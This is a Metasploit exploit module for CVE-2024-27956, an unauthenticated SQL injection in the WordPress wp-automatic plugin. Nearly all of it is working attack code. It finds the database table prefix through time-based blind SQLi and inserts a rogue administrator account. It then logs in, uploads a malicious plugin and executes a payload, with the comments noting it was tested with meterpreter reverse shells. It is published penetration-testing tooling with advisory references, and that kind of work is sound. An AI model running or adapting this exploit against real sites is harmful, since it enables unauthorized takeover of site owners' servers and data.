##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Payload::Php
  include Msf::Exploit::SQLi
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress wp-automatic Plugin SQLi Admin Creation',
        'Description' => %q{
          This module exploits an unauthenticated SQL injection vulnerability in the WordPress wp-automatic plugin (versions < 3.92.1)
          to achieve remote code execution (RCE). The vulnerability allows the attacker to inject and execute arbitrary SQL commands,
          which can be used to create a malicious administrator account. The password for the new account is hashed using MD5.
          Once the administrator account is created, the attacker can upload and execute a malicious plugin, leading to full control
          over the WordPress site.
        },
        'Author' => [
          'Rafie Muhammad',   # Vulnerability discovery
          'Valentin Lobstein' # Module Metasploit
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-27956'],
          ['WPVDB', '53a51e79-a216-4ca3-ac2d-57098fd2ebb5'],
          ['URL', 'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-automatic/automatic-3920-unauthenticated-sql-injection'],
          ['URL', 'https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin/']
        ],
        'Platform' => %w[php unix linux win],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'DisclosureDate' => '2024-03-13',
        'DefaultTarget' => 0,
        'Privileged' => false,
        'Targets' => [
          [
            'PHP In-Memory',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP
              # tested with php/meterpreter/reverse_tcp
            }
          ],
          [
            'Unix/Linux Command Shell',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command Shell',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [false, 'Username to create', Faker::Internet.username]),
        OptString.new('PASSWORD', [false, 'Password for the new user', Faker::Internet.password(min_length: 8)]),
        OptString.new('EMAIL', [false, 'Email for the new user', Faker::Internet.email])
      ]
    )
  end

  def create_sqli_instance
    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      execute_sql_query(payload, with_select: true)
    end
  end

  def execute_sql_query(query, with_select: false)
    query = with_select ? "SELECT (#{query})" : query
    response = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-automatic', 'inc', 'csv.php'),
      'method' => 'POST',
      'vars_post' => {
        'q' => query,
        'auth' => "\0",
        'integ' => Rex::Text.md5(query)
      }
    })

    unless response
      fail_with(Failure::UnexpectedReply, "Failed to execute SQL query: #{query}")
    end
  end

  def inject_admin_user(username, password, email, table_prefix)
    user_query = "INSERT INTO #{table_prefix}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('#{username}', MD5('#{password}'), '#{username}', '#{email}', NOW(), 0, '#{username}')"
    execute_sql_query(user_query, with_select: false)
  end

  def grant_admin_privileges(username, table_prefix)
    admin_query = "INSERT INTO #{table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM #{table_prefix}users WHERE user_login = '#{username}'), '#{table_prefix}capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')"
    execute_sql_query(admin_query, with_select: false)
  end

  def identify_table_prefix
    print_status('Starting the process to identify the table prefix...')

    columns = ['table_name']

    conditions = "table_schema = database() AND table_name LIKE '%\\_%users' " \
                 "AND (SELECT COUNT(*) FROM information_schema.columns c WHERE c.table_schema = tables.table_schema AND c.table_name = tables.table_name AND c.column_name IN ('user_login', 'user_pass')) = 2"

    print_status("Executing SQLi to retrieve the table prefix for users table containing 'user_login' and 'user_pass' columns...")

    table_name = @sqli.dump_table_fields('information_schema.tables', columns, conditions + ' LIMIT 1').first&.first

    if table_name
      table_prefix = table_name.gsub('_users', '_')
      print_good("Successfully detected table prefix: #{table_prefix}")
      return table_prefix
    else
      fail_with(Failure::UnexpectedReply, 'Failed to detect table prefix. The target may not be vulnerable or the conditions were incorrect.')
    end
  end

  def upload_and_execute_payload(admin_cookie)
    plugin_name = Faker::App.name.gsub(/\s+/, '').downcase
    payload_name = Faker::Hacker.noun.gsub(/\s+/, '').downcase

    payload_uri = normalize_uri(wordpress_url_plugins, plugin_name, "#{payload_name}.php")
    zip = generate_plugin(plugin_name, payload_name)

    print_status('Uploading payload...')

    uploaded = wordpress_upload_plugin(plugin_name, zip.pack, admin_cookie)
    fail_with(Failure::UnexpectedReply, 'Failed to upload the payload') unless uploaded

    print_status("Executing the payload at #{payload_uri}...")

    register_files_for_cleanup("#{payload_name}.php", "#{plugin_name}.php")
    register_dir_for_cleanup("../#{plugin_name}")
    send_request_cgi({
      'uri' => payload_uri,
      'method' => 'GET'
    }, 1)
  end

  def exploit
    create_sqli_instance

    table_prefix = identify_table_prefix

    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    email = datastore['EMAIL']

    inject_admin_user(username, password, email, table_prefix)
    grant_admin_privileges(username, table_prefix)

    print_good("#{username} is now an administrator!")

    admin_cookie = wordpress_login(username, password)

    unless admin_cookie
      fail_with(Failure::UnexpectedReply, 'Failed to log in to WordPress admin.')
    end

    upload_and_execute_payload(admin_cookie)
  end

  def check
    return CheckCode::Unknown unless wordpress_and_online?

    print_status('Attempting SQLi test to verify vulnerability...')

    create_sqli_instance

    if @sqli.test_vulnerable
      print_good('Target is vulnerable to SQLi!')
      return CheckCode::Appears
    else
      print_status('Target is not vulnerable or the SQLi test failed.')
      return CheckCode::Safe
    end
  end
end
